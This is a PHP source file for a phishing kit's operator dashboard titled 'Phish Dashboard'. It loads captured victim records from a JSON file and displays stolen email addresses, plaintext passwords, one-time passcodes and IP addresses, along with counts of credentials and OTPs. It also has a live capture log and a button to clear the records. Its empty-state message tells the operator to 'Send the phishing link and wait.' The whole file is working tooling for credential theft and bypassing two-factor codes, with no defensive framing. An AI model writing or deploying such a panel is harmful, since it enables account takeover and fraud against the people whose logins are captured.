<?php
$capture_file = __DIR__ . '/capturer/victims.json';
$victims = file_exists($capture_file) ? json_decode(file_get_contents($capture_file), true) ?? [] : [];

if(isset($_GET['clear'])) {
    file_put_contents($capture_file, json_encode([]));
    file_put_contents(__DIR__ . '/capturer/live_log.txt', '');
    header('Location: dashboard.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: Arial; background: #f5f5f5; padding: 16px; }
        h1 { font-size: 22px; margin-bottom: 16px; display: flex; justify-content: space-between; }
        h1 span { background: #6C63FF; color: #fff; padding: 2px 10px; border-radius: 20px; font-size: 14px; }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
        .stat { background: #fff; padding: 16px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .stat .num { font-size: 28px; font-weight: 700; color: #1a1a2e; }
        .stat .label { color: #666; font-size: 13px; }
        .card { background: #fff; border-radius: 12px; padding: 16px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .card .tag { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
        .tag-creds { background: #fff3e0; color: #e65100; }
        .tag-otp { background: #e8f5e9; color: #1b5e20; }
        .card .time { font-size: 12px; color: #999; margin: 4px 0; }
        .card .data { font-size: 14px; margin: 8px 0; word-break: break-all; }
        .card .data strong { color: #333; }
        .clear-btn { display: inline-block; padding: 10px 20px; background: #d32f2f; color: #fff; text-decoration: none; border-radius: 8px; font-size: 14px; margin-top: 16px; }
        .empty { text-align: center; padding: 60px 20px; color: #999; }
        .refresh-btn { display: inline-block; padding: 10px 20px; background: #6C63FF; color: #fff; text-decoration: none; border-radius: 8px; font-size: 14px; margin-right: 8px; }
        .log-view { background: #1a1a2e; color: #0f0; padding: 16px; border-radius: 8px; font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; margin-top: 16px; }
    </style>
</head>
<body>
    <h1>
        🎣 Phish Dashboard
        <span><?php echo count($victims); ?> total</span>
    </h1>

    <?php
    $creds = count(array_filter($victims, fn($v) => $v['type'] === 'credentials'));
    $otps = count(array_filter($victims, fn($v) => $v['type'] === 'otp'));
    $emails = count(array_unique(array_column(array_filter($victims, fn($v) => isset($v['email'])), 'email')));
    ?>

    <div class="stats">
        <div class="stat"><div class="num"><?php echo $creds; ?></div><div class="label">Credentials</div></div>
        <div class="stat"><div class="num"><?php echo $otps; ?></div><div class="label">OTP Codes</div></div>
        <div class="stat"><div class="num"><?php echo $emails; ?></div><div class="label">Unique Emails</div></div>
        <div class="stat"><div class="num"><?php echo $_SERVER['REMOTE_ADDR'] ?? 'N/A'; ?></div><div class="label">Your IP</div></div>
    </div>

    <div style="margin-bottom:16px;">
        <a href="dashboard.php" class="refresh-btn">🔄 Refresh</a>
        <a href="?clear=1" class="clear-btn" onclick="return confirm('Delete all?')">🗑️ Clear</a>
    </div>

    <?php if(empty($victims)): ?>
        <div class="empty">
            <p style="font-size:48px;margin-bottom:16px;">📭</p>
            <p>No victims yet.</p>
            <p style="font-size:13px;margin-top:8px;">Send the phishing link and wait.</p>
        </div>
    <?php else: ?>
        <?php foreach(array_reverse($victims) as $v): ?>
        <div class="card">
            <div>
                <span class="tag tag-<?php echo $v['type']; ?>"><?php echo $v['type']; ?></span>
                <span class="time"><?php echo $v['timestamp']; ?></span>
            </div>
            <div class="data">
                <?php if(isset($v['email'])): ?>
                    <strong>Email:</strong> <?php echo htmlspecialchars($v['email']); ?><br>
                <?php endif; ?>
                <?php if(isset($v['password'])): ?>
                    <strong>Password:</strong> <?php echo htmlspecialchars($v['password']); ?><br>
                <?php endif; ?>
                <?php if(isset($v['otp'])): ?>
                    <strong>OTP:</strong> <?php echo htmlspecialchars($v['otp']); ?><br>
                <?php endif; ?>
                <strong>IP:</strong> <?php echo $v['ip']; ?>
            </div>
        </div>
        <?php endforeach; ?>
    <?php endif; ?>

    <h2 style="font-size:16px;margin:20px 0 8px;">📋 Live Log</h2>
    <div class="log-view"><?php 
        $log = file_exists(__DIR__ . '/capturer/live_log.txt') ? file_get_contents(__DIR__ . '/capturer/live_log.txt') : 'No logs yet.';
        echo htmlspecialchars($log);
    ?></div>
</body>
</html>
